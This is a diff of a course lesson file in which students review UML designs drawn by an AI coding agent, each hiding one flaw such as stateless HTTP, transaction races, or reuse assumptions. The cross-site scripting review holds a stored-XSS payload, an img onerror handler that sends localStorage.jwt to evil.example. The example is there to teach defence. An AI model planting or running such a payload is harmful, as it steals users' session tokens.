@@ -1,10 +1,10 @@
 title: "Reviewing an AI Agent's Design with UML"
-description: "Review ten designs an AI coding agent drew as UML diagrams, each with one flaw a CS 35L concept explains: write the review comment, let the model on your device check it, and compare it with the expert review. Assumes the CS 35L lectures and UML class, sequence, and component diagrams."
+description: "Practice ten CS 35L concepts by reviewing designs an AI coding agent drew as UML diagrams: write the review comment, let the model on your device check it, and compare it with the expert review. Assumes the CS 35L lectures and UML class, sequence, and component diagrams."
 
 # Authoring metadata; the runtime ignores it.
 learning_objectives:
   - "Evaluate an AI agent's UML design against a user story by tracing a concrete Given scenario through the diagram."
-  - "Analyze which course concept a design violates: information hiding, statelessness, test doubles, transactions, streams, sanitization, version control, memory ownership, reuse, and separation of concerns."
+  - "Apply ten course concepts to find where a design violates them: information hiding, stateless HTTP, test doubles, transaction isolation, standard streams, XSS, shared Git history, C memory ownership, reuse, and separation of concerns."
   - "Explain a design flaw convincingly: name the element, trace cause to effect, and show which part of the story fails."
   - "Propose a design change that removes the cause of the flaw rather than hiding its symptom."
   - "Select the view (class, sequence, or component) that shows the answer to a design question."
@@ -30,52 +30,49 @@ steps:
   # Schedule design (L14 slides 65-66) shows the three parts of a comment;
   # the learner's comment starts with the flaw already named and adds the
   # consequence and the fix. Change impact analysis (L16 slide 28) supplies
-  # the Given. Titles name the system, not the concept: the concept is the
-  # answer, and the lesson reveals it.
-  - title: "Review 1: Late-Night Food-Truck Pre-Orders"
+  # the Given. Every step names its CS 35L concept in the title, the opener,
+  # and the task, with the lecture's review question, so the learner
+  # practices applying that concept (concept-first, direct practice);
+  # telling concepts apart is left to the mixed knowledge checks. The case
+  # keeps only the claims that bear on the concept, to keep reading short.
+  - title: "Review 1: Information Hiding — Food-Truck Pre-Orders"
     key: food-truck-payments
-    estimated_minutes: 10
+    estimated_minutes: 8
     instructions: |
       ### Why this matters
 
-      An agent can draw a tidy class diagram in seconds, and reading every line of the code it then writes is no longer realistic. A design review catches the decisions that will be expensive later, while they are still one sentence to change.
+      Information hiding keeps each design decision that is likely to change inside one class, so changing it later touches one class instead of many.
 
       ### 🎯 You will learn to
 
-      - Evaluate a class diagram by tracing a likely change through it.
+      - Apply information hiding to a class diagram by tracing a likely change through it.
       - Write a review comment in three parts: the flaw, what goes wrong, and the fix.
 
-      ### What a good review comment looks like
+      **Review question:** if this decision changes, how many classes change with it?
 
-      In lecture, an agent designed a course scheduler in which `Schedule` exposed `+meetings: dict[str, list[tuple]]`, and `WeekView`, `ClashChecker`, and `IcsExport` all read it. A strong comment on that design reads:
+      ### A model comment
 
-      > **Flaw:** `meetings` is public, so `WeekView`, `ClashChecker`, and `IcsExport` all depend on how meeting times are stored. **What goes wrong:** when we store times differently (say, to add time zones), all three classes change, not just `Schedule`. **Fix:** make `meetings` private and give `Schedule` methods such as `sessions()`, so only `Schedule` knows the storage format.
+      In lecture, an agent's `Schedule` class exposed `+meetings: dict[str, list[tuple]]`, and `WeekView`, `ClashChecker`, and `IcsExport` all read it:
 
-      Notice what makes it convincing: it **names diagram elements**, it **traces one concrete change** to its effect, and its **fix removes the cause** rather than patching each class.
+      > **Flaw:** `meetings` is public, so three classes depend on how meeting times are stored. **What goes wrong:** storing times differently (say, with time zones) changes all three. **Fix:** make `meetings` private and give `Schedule` methods such as `sessions()`.
 
-      ### Your turn
-
-      This time the comment box already names the flaw. Read the agent's design, then write **what goes wrong** in the Given scenario and **the fix**. **Check my review** asks the model on your device for feedback; **Compare with the expert review** shows the expert's comment.
+      It names diagram elements, traces one change to its effect, and its fix removes the cause.
     design_review:
       min_words: 25
       request: |
-        "Design the backend for pre-ordering from the late-night food trucks on the Hill. Show me a class diagram before you write any code."
+        "Design the backend for pre-ordering from the food trucks on the Hill. Show me a class diagram first."
       story: |
-        **As a** student on the Hill, **I want** to pre-order from the late-night food trucks and pay with my card, **so that** my food is ready when I walk up.
+        **As a** student on the Hill, **I want** to pre-order from the food trucks and pay by card, **so that** my food is ready when I walk up.
       acceptance_criteria:
-        - "**Given** I have items in my cart, **when** I pay, **then** the truck receives my order and I get a receipt."
-        - "**Given** a truck cancels my order, **when** the cancellation arrives, **then** my payment is refunded in full."
+        - "**Given** items in my cart, **when** I pay, **then** the truck gets my order and I get a receipt."
       reply: |
-        Here is the class design for the pre-order backend:
-
         - **`PaymentGateway` interface:** the services never call Stripe directly, so we stay provider-independent.
         - **`StripeGateway`** implements it with Stripe's Python SDK.
-        - **`Order` keeps its payment**, so a refund can reference the original charge.
         - **`RewardsService`** awards a loyalty point per dollar charged.
-
-        Want me to scaffold the Python modules next?
       given: |
-        UCLA Dining announces that next quarter every truck on the Hill must also accept **BruinCard**, through UCLA's own payment service, **BruinPay**. List the classes that must change to add it.
+        Next quarter, every truck must also accept **BruinCard** through UCLA's own payment service, **BruinPay**. Which classes change to add it?
+      task: |
+        The comment names the flaw. Add **what goes wrong** when BruinPay is added, and **the fix**.
       scaffold: |
         Flaw: PaymentGateway is meant to hide which payment provider we use, but its operations take a StripeCard and return a StripeCharge, so Stripe's types leak into the classes that use it.
         What goes wrong:
@@ -283,7 +280,7 @@ steps:
           correct_indices: [0, 1, 2]
           option_feedback:
             0: "`placeOrder(cart, card: StripeCard)` takes a Stripe type, so it changes when a BruinCard payment arrives."
-            1: "`addPoints(studentId, charge: StripeCharge)` only knows Stripe charges; a BruinPay payment is not one."
+            1: "`addPoints(charge: StripeCharge)` only knows Stripe charges; a BruinPay payment is not one."
             2: "`Order.payment: StripeCharge` stores a Stripe type, so orders paid with BruinCard cannot be represented."
             3: "`StripeClient` belongs to Stripe's SDK and keeps working for Stripe payments; the change is in our classes that use Stripe's types."
           explanation: "Every class whose signature or attribute names a Stripe type changes; with provider-neutral types, only a new `BruinPayGateway` would be added."
@@ -312,47 +309,41 @@ steps:
   # account never shows (L5 slide 13: HTTP is stateless; L11 slides 26-29:
   # session IDs). The knowledge check reaches L5's UDP absolute positions
   # and spaces step 1's information hiding.
-  - title: "Review 2: CS 35L Midterm Scores"
+  - title: "Review 2: Stateless HTTP — Midterm Scores"
     key: midterm-scores-login
-    estimated_minutes: 11
+    estimated_minutes: 9
     instructions: |
       ### Why this matters
 
-      A sequence diagram shows what each message carries and what each participant knows when it answers. Tracing a concrete scenario through it, message by message, exposes failures that a quick demo hides.
+      HTTP is stateless: the server doesn't remember earlier requests from the same client. Every web app that shows users their own data has to deal with that.
 
       ### 🎯 You will learn to
 
-      - Analyze a sequence diagram by tracing a Given scenario through it, one message at a time.
-      - Write a complete review comment: the flaw, what goes wrong, and a fix.
+      - Apply statelessness and sessions to a sequence diagram by tracing two students' requests through it.
 
-      This time you find the flaw yourself. The review box gives you a sentence starter for each part of the comment.
+      **Review question:** how does the server know which student sent this request?
+
     design_review:
       min_words: 30
       request: |
-        "Build the backend for a My Scores page: CS 35L students log in and see their midterm score and rubric comments. Use Node.js and Express. Show me a sequence diagram of logging in and opening My Scores before you write any code."
+        "Build a My Scores page with Node.js and Express: CS 35L students log in and see their midterm score. Show me a sequence diagram first."
       story: |
-        **As a** CS 35L student, **I want** to see my midterm score and the rubric comments, **so that** I know what to review before the final.
+        **As a** CS 35L student, **I want** to see my midterm score and rubric comments, **so that** I know what to review before the final.
       acceptance_criteria:
-        - "**Given** I am logged in, **when** I open My Scores, **then** I see my own score and comments."
+        - "**Given** I am logged in, **when** I open My Scores, **then** I see my own score."
         - "**Given** I am not logged in, **when** I open My Scores, **then** I am asked to log in."
       reply: |
-        Here is the sequence for logging in and opening My Scores:
-
-        - **`AuthService` checks the password**, and the server never stores it.
         - **Both requests use HTTPS**, so nothing travels in plain text.
-        - **The server remembers who logged in**, so later requests don't have to resend the password.
+        - **The server remembers who logged in**, so later requests don't resend the password.
         - **The scores query is parameterized**, so a crafted UID cannot inject SQL.
-        - **Not logged in?** My Scores redirects to the login page.
-
-        Want me to scaffold the Express routes next?
       given: |
-        Ana logs in at **9:00:00**. Ben logs in from his laptop at **9:00:05**. At **9:00:07**, Ana opens My Scores. Trace her request through the diagram: whose score and comments does she see?
+        Ana logs in at **9:00:00** and Ben at **9:00:05**. At **9:00:07**, Ana opens My Scores. Whose score does she see?
       task: |
-        Write your comment in three parts. Finish each sentence starter in your own words:
+        Finish each sentence starter in your own words:
 
-        - **Flaw:** The design breaks at …, because …
-        - **What goes wrong:** In the Given scenario, …, so …
-        - **Fix:** Change … so that …
+        - **Flaw:** Because HTTP is stateless, …
+        - **What goes wrong:** When Ana opens My Scores at 9:00:07, …
+        - **Fix:** Change … so that each request …
       diagrams:
         - id: midterm-scores-sequence
           type: sequence
@@ -616,46 +607,42 @@ steps:
   # review. Sentence starters stay one more step; step 4 drops them. The
   # knowledge check reaches L10 (reproduce the bug first) and TDD's "testing
   # the test", and spaces step 2's stateless HTTP.
-  - title: "Review 3: Dorm Laundry Alerts"
+  - title: "Review 3: Test Doubles — Dryer Alerts"
     key: laundry-alert-test
-    estimated_minutes: 11
+    estimated_minutes: 9
     instructions: |
       ### Why this matters
 
-      Agents write tests as fast as they write code, and a green check mark feels like proof. Reviewing a test's design tells you whether it would turn red when the feature breaks.
+      A green test proves something only if it would turn red when the feature breaks, and the test double you choose decides what a test can observe.
 
       ### 🎯 You will learn to
 
-      - Evaluate whether a test, drawn as a sequence diagram, fails when the feature it checks breaks.
-      - Trace a bug through a test's interactions to decide whether its assertion notices.
+      - Apply test doubles (stub, spy, mock) to a test drawn as a sequence diagram: decide whether it fails when the feature breaks.
 
-      This review is about a test, not about the feature it tests. The sentence starters are still there; the next review drops them.
+      **Review question:** what does this test let me observe: inputs I control, or outputs I can check?
+
+      This review is about the test, not the feature it tests.
     design_review:
       min_words: 30
       request: |
-        "Add an automated test for the dryer-done alert, and run it on every push. Show me a sequence diagram of the test first."
+        "Add a test for the dryer-done alert that runs on every push. Show me a sequence diagram of the test first."
       story: |
-        **As a** student in Sproul Hall, **I want** a push notification when my dryer finishes, **so that** nobody dumps my clothes on the floor.
+        **As a** student in Sproul Hall, **I want** a notification when my dryer finishes, **so that** nobody dumps my clothes on the floor.
       acceptance_criteria:
         - "**Given** I started dryer D7, **when** D7 finishes, **then** I get the notification “Dryer D7 is done”."
         - "**Given** someone else started D7, **when** D7 finishes, **then** I get no notification about it."
       reply: |
-        Here is `test_cycle_finished`, the test for the dryer-done alert:
-
-        - **No real notifications:** `PushStub` stands in for the push service, so CI never pings anyone's phone.
-        - **Repeatable:** `RosterStub` holds a fixed roster, so every run gets the same answer.
-        - **Fast:** no network calls; it runs in milliseconds on every push.
+        - **`PushStub`** stands in for the push service, so CI never pings a real phone.
+        - **`RosterStub`** holds a fixed roster, so every run gets the same answer.
         - **One clear assertion:** the alert comes back `"queued"`.
-
-        I added it to the GitHub Actions workflow. Want tests for the washers too?
       given: |
-        A teammate's refactoring adds a bug: `AlertService` now looks up the student for dryer **D6** instead of D7. The change is pushed. Trace `test_cycle_finished` with the bug: does CI turn red, and who gets D7's alert?
+        A refactoring bug makes `AlertService` look up the student for dryer **D6** instead of D7. Does `test_cycle_finished` turn red, and who gets D7's alert?
       task: |
-        Write your comment in three parts. Finish each sentence starter in your own words:
+        Finish each sentence starter in your own words:
 
-        - **Flaw:** The test …, but …
-        - **What goes wrong:** With the Given bug, …, so …
-        - **Fix:** Change … so that the test …
+        - **Flaw:** `PushStub` is a stub, so the test …
+        - **What goes wrong:** With the D6 bug, …
+        - **Fix:** Replace `PushStub` with … so that the test …
       diagrams:
         - id: laundry-alert-test-sequence
           type: sequence
@@ -741,7 +728,7 @@ steps:
         fix: |
           Replace `PushStub` with a **Test Spy** that records every `send(student, text)` call, and assert that exactly one alert went to `"ana"` with the text `"Dryer D7 is done"`. A **Mock Object** that expects this call works too. Keep `RosterStub`: it correctly controls the indirect input.
         more: |
-          Everything the agent praised is true: no phone gets pinged, and the test is fast and repeatable. Using doubles instead of real services was the right move; this test just stubbed out the very output it was meant to check.
+          Everything the agent praised is true: no phone gets pinged, and every run gets the same answer. Using doubles instead of real services was the right move; this test just stubbed out the very output it was meant to check.
       annotated:
         label: "The flaw, annotated"
         type: sequence
@@ -883,49 +870,46 @@ steps:
   # ==========================================================================
   # STEP 4: UCLA Radio weekly Top 10 (streams: diagnostics belong on stderr)
   # ==========================================================================
-  # Pedagogy: fading completed, interleaving. The default task replaces the
-  # sentence starters, so the learner now structures the comment alone. The
-  # view switches to a component diagram with ports, drawn in L2's own
-  # notation (slide 12: stdin, stdout, and stderr ports; pipes connect
-  # them), and the concept switches to shell streams, so the learner must
-  # decide which concept applies. The second acceptance criterion keeps the
-  # warnings required, which rules out "just delete them" as a fix. The
-  # knowledge check reaches L3's shared class attribute (an underlined UML
-  # attribute) and spaces step 3's test doubles.
-  - title: "Review 4: UCLA Radio Weekly Top 10"
+  # Pedagogy: fading completed, interleaving. A one-line task that names the
+  # concept's terms replaces the sentence starters, so the learner now
+  # structures the comment alone. The view switches to a component diagram
+  # with ports, drawn in L2's own notation (slide 12: stdin, stdout, and
+  # stderr ports; pipes connect them), and the concept switches to shell
+  # streams. The second acceptance criterion keeps the warnings required,
+  # which rules out "just delete them" as a fix. The knowledge check reaches
+  # L3's shared class attribute (an underlined UML attribute) and spaces
+  # step 3's test doubles.
+  - title: "Review 4: Standard Streams — UCLA Radio Top 10"
     key: radio-top10-pipeline
-    estimated_minutes: 12
+    estimated_minutes: 10
     instructions: |
       ### Why this matters
 
-      Small programs chained together are only as reliable as what flows between them. Reviewing each connection in a component diagram catches bugs that no single program's tests reveal.
+      Pipelines connect small programs through their standard streams, so whether a program writes a line to stdout or to stderr decides where that line ends up.
 
       ### 🎯 You will learn to
 
-      - Trace data through a component diagram, port by port, for a Given input.
-      - Write a complete review comment without sentence starters.
+      - Apply stdout and stderr to a component diagram of a pipeline, port by port.
 
-      From here on, the review box gives no sentence starters: structure your comment yourself.
+      **Review question:** if this line flows into the next program, what does that program do with it?
+
     design_review:
       min_words: 30
       request: |
-        "Build the job that makes UCLA Radio's weekly Top 10 chart from the DJ console's play log. Show me a component diagram of it before you write any code."
+        "Build the job that makes UCLA Radio's weekly Top 10 from the DJ console's play log. Show me a component diagram first."
       story: |
-        **As** UCLA Radio's music director, **I want** a weekly Top 10 of the most played songs, **so that** I can post the chart on Instagram every Monday.
+        **As** UCLA Radio's music director, **I want** a weekly Top 10 of the most played songs, **so that** I can post it every Monday.
       acceptance_criteria:
-        - "**Given** last week's play log, **when** the chart job runs, **then** `top10.txt` lists exactly ten songs with their play counts."
-        - "**Given** a log line that cannot be parsed, **when** the chart job runs, **then** the line is skipped and a warning is kept for the station's tech team."
+        - "**Given** last week's play log, **when** the job runs, **then** `top10.txt` lists the ten most played songs with their play counts."
+        - "**Given** a log line that cannot be parsed, **when** the job runs, **then** the line is skipped and a warning is kept for the tech team."
       reply: |
-        Here is the weekly chart job, `weekly_chart.sh`, as a pipeline of small programs:
-
-        - **`extract_plays.py`** reads the log as UTF-8 and prints one `Artist - Title` line per play, in Title Case, so "Kiss Me" and "kiss me" count as one song.
-        - **Nothing fails silently:** a log line it cannot parse prints a warning instead of vanishing.
-        - **`sort | uniq -c | sort -rn | head -n 10`** counts the plays and keeps the ten most played songs.
-        - **Streams end to end:** no temporary files. cron runs the job every Monday at 6:00 and writes `top10.txt`.
-
-        Want me to add a script that posts the chart to Instagram?
+        - **`extract_plays.py`** prints one `Artist - Title` line per play.
+        - **Nothing fails silently:** a line it cannot parse prints a warning.
+        - **`sort | uniq -c | sort -rn | head -n 10`** counts the plays and keeps the top ten.
       given: |
-        On Thursday, the DJ console glitched and wrote **300 truncated lines** into the play log. Last week's most played song had **41 plays**. Trace Monday's run through the diagram: what does `top10.txt` list?
+        This week the DJ console wrote **300 truncated lines** into the log, and the most played song had **41 plays**. What does `top10.txt` list?
+      task: |
+        Write the flaw, what goes wrong in the Given, and a fix that removes the cause. Use **stdout** and **stderr** in your comment.
       diagrams:
         - id: radio-top10-components
           type: component
@@ -1131,7 +1115,7 @@ steps:
   # ==========================================================================
   # STEP 5: Powell study rooms (isolation: let the database decide)
   # ==========================================================================
-  # Pedagogy: interleaved review with the default task (fading: no sentence
+  # Pedagogy: interleaved review with a concept-named task (fading: no sentence
   # starters). The Given supplies timings so the learner can replay two
   # requests on one timeline; that trace turns "every call is correct" into
   # a concrete double booking. L8 explains it (slide 3, simultaneous edits;
@@ -1140,41 +1124,35 @@ steps:
   # crashes, so the learner must discriminate the two. The knowledge check
   # spaces step 2 (stateless HTTP) and reaches the CAP theorem (L8 slides
   # 30-33), which has no review of its own.
-  - title: "Review 5: Powell Study Room Booking"
+  - title: "Review 5: Transaction Isolation — Study Rooms"
     key: study-room-booking
-    estimated_minutes: 11
+    estimated_minutes: 9
     instructions: |
       ### Why this matters
 
-      A sequence diagram shows one tidy run of a feature. Replaying the Given scenario through it, message by message, is how a reviewer checks the agent's promises instead of taking them on trust.
+      Web apps serve many users at once, and transactions with isolation are how a database keeps their simultaneous edits from breaking shared data.
 
       ### 🎯 You will learn to
 
-      - Evaluate a sequence diagram by replaying the Given scenario through it, message by message.
-      - Write a complete review comment, with the flaw, what goes wrong, and the fix, in your own words.
+      - Apply transactions and isolation to a sequence diagram by replaying two requests on one timeline.
 
-      Read the agent's reply as a list of claims, not facts: your trace of the Given can confirm or refute each one.
+      **Review question:** what if two users do this at the same moment?
     design_review:
       min_words: 35
       request: |
-        "Design the booking backend for Powell Library's group study rooms. Show me a sequence diagram of one booking before you write any code."
+        "Design the booking backend for Powell Library's group study rooms. Show me a sequence diagram of one booking first."
       story: |
-        **As a** student, **I want** to book a Powell study room for my group, **so that** we have a quiet place to prepare before the midterm.
+        **As a** student, **I want** to book a Powell study room for my group, **so that** we have a quiet place to study before the midterm.
       acceptance_criteria:
-        - "**Given** a room slot is free, **when** I book it, **then** I see a confirmation and get an email with the room and time."
-        - "**Given** a room slot is free, **when** two students book it at the same time, **then** exactly one booking succeeds and the other student sees that the slot was just taken."
+        - "**Given** a free slot, **when** two students book it at the same time, **then** exactly one booking succeeds and the other student sees “just taken”."
       reply: |
-        Here is the booking flow:
-
-        - **`BookingAPI` checks before it books:** it counts the slot's bookings and inserts only when the count is 0, so a slot can never be booked twice.
-        - **Each query commits on its own** (autocommit), so no long transaction holds up other students during the midterm rush.
-        - **`409 Conflict` with "just taken"** when the slot is booked, so the page can suggest the next free slot.
-        - **The confirmation email is sent asynchronously**, so a slow mail server never delays a booking.
+        - **Checks before it books:** `BookingAPI` inserts only when the slot has 0 bookings, so a slot can never be booked twice.
+        - **Each query commits on its own** (autocommit), so no long transaction slows down the midterm rush.
         - **Every query is parameterized**, so a room name cannot inject SQL.
-
-        Want me to write the Express routes next?
       given: |
-        Room 4C has one free slot left on Thursday, 7–9 pm. Ana and Ben both click **Book** for it: their requests reach `BookingAPI` 2 ms apart, and during the midterm rush each database call takes about 5 ms. Trace both requests through the diagram. What does each of them see?
+        Room 4C has one free slot left: Thursday, 7–9 pm. Ana's and Ben's **Book** requests reach `BookingAPI` 2 ms apart, and each database call takes about 5 ms. What does each of them see?
+      task: |
+        Write the flaw, what goes wrong in the Given, and a fix that removes the cause. Explain the flaw in terms of **transactions and isolation**.
       diagrams:
         - id: study-room-booking-sequence
           type: sequence
@@ -1391,7 +1369,7 @@ steps:
   # ==========================================================================
   # STEP 6: Rate My Dining Hall (cross-site scripting; zero trust)
   # ==========================================================================
-  # Pedagogy: interleaved review with the default task. The learner follows
+  # Pedagogy: interleaved review with a concept-named task. The learner follows
   # one input across components, from Ben's request through storage into
   # Ana's browser. L11 explains the flaw (slide 15, XSS; slide 17, the
   # Twitter worm that failed to "sanitize or escape"; slide 18, zero trust),
@@ -1402,39 +1380,33 @@ steps:
   # the knowledge check turns into a discrimination item (SQL injection
   # versus XSS). It also reaches least privilege (L11 slides 35-36) and
   # spaces step 4 (stdout and stderr).
-  - title: "Review 6: Rate My Dining Hall"
+  - title: "Review 6: Cross-Site Scripting — Dining Reviews"
     key: dining-reviews-xss
-    estimated_minutes: 12
+    estimated_minutes: 10
     instructions: |
       ### Why this matters
 
-      A component diagram shows where data enters a system, where it is kept, and where it is shown again. Following one piece of data across every component it touches finds the problems that no single component owns.
+      Cross-site scripting (XSS) lets an attacker's text run as code in other users' browsers, with their rights. Any site that shows what its users wrote has to rule it out.
 
       ### 🎯 You will learn to
 
-      - Evaluate a component diagram by following one input from the request that brings it in to every screen that shows it.
-      - Distinguish a protection a design really has from one it only appears to have.
+      - Apply XSS and zero trust to a component diagram by following one input from the request to every screen that shows it.
 
-      Play the Given as the student who sends it: which component would have to stop the request, and does the design make it do so?
+      **Review question:** where does another user's text become HTML in a reader's browser?
     design_review:
       min_words: 35
       request: |
-        "Build 'Rate My Dining Hall' for Bruin Plate, Epicuria, and De Neve. Reviews should support bold text and links to photos. Show me a component diagram before you write any code."
+        "Build 'Rate My Dining Hall', with reviews that support bold text and links to photos. Show me a component diagram first."
       story: |
-        **As a** student, **I want** to write dining-hall reviews with bold text and links to photos, **so that** my reviews are fun to read.
+        **As a** student, **I want** to write dining-hall reviews with bold text and photo links, **so that** my reviews are fun to read.
       acceptance_criteria:
         - "**Given** a review with formatting, **when** anyone opens the dining hall's page, **then** they see the formatting."
         - "**Given** any review, **when** another student reads it, **then** their account stays safe."
       reply: |
-        Here is the component design:
-
-        - **`ReviewEditor`** (React) is a rich-text editor that offers only bold, italics, and links, so the HTML it sends is always safe.
-        - **`ReviewAPI`** (Express) stores each review's body exactly as sent, so the formatting survives.
-        - **`ReviewList`** renders each body with React's `dangerouslySetInnerHTML`, so bold text and links show up on the page.
-        - **`ReviewsDB`** is reached only through parameterized SQL, and `ReviewAPI` accepts at most 10 reviews per student per hour.
-        - **Login** uses UCLA single sign-on. The app keeps the resulting JWT in the browser's local storage (`localStorage.jwt`), so students stay logged in for a week.
-
-        Want me to scaffold the React components next?
+        - **`ReviewEditor`** offers only bold, italics, and links, so the HTML it sends is always safe.
+        - **`ReviewList`** renders each stored body with React's `dangerouslySetInnerHTML`, so the formatting shows.
+        - **`ReviewsDB`** is reached only through parameterized SQL.
+        - **Login** keeps the student's JWT in local storage (`localStorage.jwt`) for a week.
       given: |
         Ben skips the editor and sends `POST /reviews` with `curl`. His review of Epicuria has this body (`x` is not an image, so the browser runs the `onerror` code):
 
@@ -1442,7 +1414,9 @@ steps:
         <b>Best tacos!</b><img src="x" onerror="fetch('https://evil.example/?t=' + localStorage.jwt)">
         ```
 
-        A minute later, Ana opens Epicuria's page. Trace Ben's review from his request to Ana's screen: what runs, where, and with whose rights?
+        Then Ana opens Epicuria's page. What runs, where, and with whose rights?
+      task: |
+        Write the flaw, what goes wrong in the Given, and a fix that removes the cause. Explain the flaw in terms of **XSS** and **zero trust**.
       diagrams:
         - id: dining-reviews-components
           type: component
@@ -1651,7 +1625,7 @@ steps:
   # ==========================================================================
   # STEP 7: Rose Bowl mobile tickets (reuse: identify violated assumptions)
   # ==========================================================================
-  # Pedagogy: interleaved review with the default task. The learner pushes
+  # Pedagogy: interleaved review with a concept-named task. The learner pushes
   # the story's numbers through a reused class and finds an assumption that
   # held in the old context only: the Ariane 5 lesson (L12 slides 23-25) on
   # campus, where five bug-free years at a 600-seat theater are evidence for
@@ -1659,40 +1633,35 @@ steps:
   # learner must discriminate rather than blame reuse as such. The knowledge
   # check reaches L12's fixed dependency versions (urllib3) and trivial
   # dependencies (left-pad), and spaces step 1 (information hiding).
-  - title: "Review 7: Rose Bowl Mobile Tickets"
+  - title: "Review 7: Software Reuse — Rose Bowl Tickets"
     key: rose-bowl-counter
-    estimated_minutes: 11
+    estimated_minutes: 9
     instructions: |
       ### Why this matters
 
-      A Given scenario lets you test a design without running anything: take the story's numbers and push them through every class, attribute, and operation on the path. Where the trace gets stuck, you have found your review comment.
+      Reusing tested code saves time, but software that worked in one context might not work in another.
 
       ### 🎯 You will learn to
 
-      - Evaluate a class diagram by pushing the Given scenario's numbers through each class and operation it reaches.
-      - Propose a fix that removes the cause, plus a check that would have caught the flaw before release.
+      - Apply software reuse to a class diagram: check each reused part's assumptions against the new context's numbers.
 
-      Quote the numbers you use, from the story, the Given, and the diagram: a review with numbers is hard to argue with.
+      **Review question:** what did this part assume before, and is it still true here?
     design_review:
       min_words: 35
       request: |
-        "Build mobile ticketing for UCLA football home games at the Rose Bowl. Reuse what you can from the Freud Playhouse box office. Show me a class diagram before you write any code."
+        "Build mobile tickets for UCLA football at the Rose Bowl. Reuse what you can from the Freud Playhouse box office. Show me a class diagram first."
       story: |
-        **As a** Bruins fan, **I want** to buy a ticket for the home opener on my phone, **so that** I don't wait in line at the box office.
+        **As a** Bruins fan, **I want** to buy a ticket on my phone, **so that** I don't wait in line at the box office.
       acceptance_criteria:
-        - "**Given** a seat is free, **when** I buy it, **then** I get a ticket with a QR code on my phone."
         - "**Given** the Rose Bowl's roughly 89,000 seats, **when** fans buy tickets, **then** every seat can be sold online."
       reply: |
-        Here is the class design:
-
-        - **Reused unchanged:** `SeatInventory` and `TicketCounter` from the Freud Playhouse box office. They have run for five years with no bug reports, so we skip rewriting and retesting them.
+        - **Reused unchanged:** `SeatInventory` and `TicketCounter` from the Freud Playhouse box office, five years in production with no bug reports.
         - **`TicketService.buy()`** reserves the seat, takes the next ticket number from `TicketCounter`, and returns a signed `QrTicket`.
-        - **QR codes are signed**, so an edited screenshot fails the scan at the gate.
-        - **`FanApp`** (React Native) runs on iPhone and Android and adds each ticket to the phone's wallet.
-
-        Want me to port the box-office module next?
+        - **Signed QR codes**, so an edited screenshot fails the scan at the gate.
       given: |
-        Sales for the home opener open Monday at 9 am, and fans buy fast. At 9:40, ticket number 32,768 is being sold. Trace this sale through `TicketService.buy()`. What happens to this fan, and to the fans who buy after?
+        Sales for the home opener open at 9 am. At 9:40, ticket number **32,768** is being sold. What happens to this fan, and to the fans who buy after?
+      task: |
+        Write the flaw, what goes wrong in the Given, and a fix that removes the cause. Explain the flaw in terms of the **assumptions** a reused part makes.
       diagrams:
         - id: rose-bowl-classes
           type: class
@@ -1905,7 +1874,7 @@ steps:
   # ==========================================================================
   # STEP 8: Game-jam release bot (never rewrite shared history)
   # ==========================================================================
-  # Pedagogy: faded scaffolding (default task, three-rung coach ladders) and
+  # Pedagogy: faded scaffolding (concept-named task, three-rung coach ladders) and
   # interleaving. Like the room booking in step 5, the Given is two writers
   # racing, but the concept is Git's: a force push switches off the check
   # that rejects a push missing a teammate's commit, and the squash rewrites
@@ -1914,39 +1883,36 @@ steps:
   # push --force; revert is not; the safe zone). The knowledge check reaches
   # L10 (revert), transfers to another bot, spaces step 5 (a bike-share race),
   # and covers L19 (the Sprint Backlog does not change during a sprint).
-  - title: "Review 8: Nightly Game-Jam Release Bot"
+  - title: "Review 8: Shared Git History — Release Bot"
     key: game-jam-release-bot
-    estimated_minutes: 11
+    estimated_minutes: 9
     instructions: |
       ### Why this matters
 
-      Agents now write the automations that run on a team's repository every night, with nobody watching. Walking through one run of such a workflow, step by step and against a real timeline, catches problems before they repeat every night.
+      Git lets a team build on each other's commits, and agents now write automations that push to a team's branches every night with nobody watching.
 
       ### 🎯 You will learn to
 
-      - Analyze a sequence diagram by placing an outside event between two of its messages.
-      - Evaluate an automated workflow against the team's user story in a concrete scenario.
+      - Apply Git's rule against rewriting shared history to a sequence diagram of an automated workflow.
 
-      A game-jam team asked an agent to automate its nightly release. Write the review comment you would post before the workflow is merged: the flaw, what goes wrong in the Given scenario, and the fix. No sentence starters this time.
+      **Review question:** what happens to a teammate's commit that lands between this workflow's fetch and its push?
     design_review:
       min_words: 30
       request: |
-        "Set up a nightly release for our game-jam game: build it, put it on itch.io, and clean up `main` while you're at it, because its history is a wall of “wip” and “asdf” commits. Show me a sequence diagram of one nightly run before you write the workflow."
+        "Set up a nightly release of our game-jam game to itch.io, and clean up `main`: its history is all “wip” and “asdf” commits. Show me a sequence diagram of one run first."
       story: |
-        **As a** member of the game-jam team, **I want** a playable build of our game on itch.io every night, **so that** our playtesters can try the newest version each morning.
+        **As a** game-jam teammate, **I want** a playable build on itch.io every night, **so that** our playtesters can try the newest version each morning.
       acceptance_criteria:
-        - "**Given** a teammate pushed a fix to `main`, **when** the next nightly release runs, **then** the build on itch.io includes the fix."
+        - "**Given** a teammate pushed a fix to `main`, **when** the next nightly release runs, **then** the build includes the fix."
         - "**Given** a day of “wip” and “asdf” commits, **when** we read the log of `main`, **then** each entry says what changed."
       reply: |
-        Here is one nightly run of the release workflow (a GitHub Action):
-
         - **Builds before it releases:** a build that fails never reaches itch.io.
         - **One commit per day:** `squashDay()` turns the day's commits into "Nightly build 13", so the log of `main` reads like a changelog.
         - **Uploads with butler**, itch.io's command-line uploader, right after the push.
-
-        Want me to write `.github/workflows/nightly.yml` next?
       given: |
-        Tonight the bot fetches `main` at 23:55. At 23:57, while the bot is still building, Maya pushes her fix for the boss-fight crash to `main`. What does `main` on GitHub hold after the run, and which build will contain her fix?
+        The bot fetches `main` at **23:55**. At **23:57**, while it is still building, Maya pushes her fix for the boss-fight crash to `main`. What does `main` hold after the run, and which build contains her fix?
+      task: |
+        Write the flaw, what goes wrong in the Given, and a fix that removes the cause. Explain the flaw in terms of **shared history**.
       diagrams:
         - id: release-bot-run
           type: sequence
@@ -2158,7 +2124,7 @@ steps:
   # ==========================================================================
   # STEP 9: Karaoke machine in C (exactly one owner per allocation)
   # ==========================================================================
-  # Pedagogy: faded scaffolding (default task, three-rung coach ladders) and a
+  # Pedagogy: faded scaffolding (concept-named task, three-rung coach ladders) and a
   # plausible trap: the agent's reply promises "nothing leaks", which is true,
   # so a learner who checks only for leaks finds nothing. Each module follows
   # a sensible local rule (free what you allocate; free what you store), and
@@ -2167,40 +2133,36 @@ steps:
   # SEBook c.md ("every malloc is a contract"). The knowledge check transfers
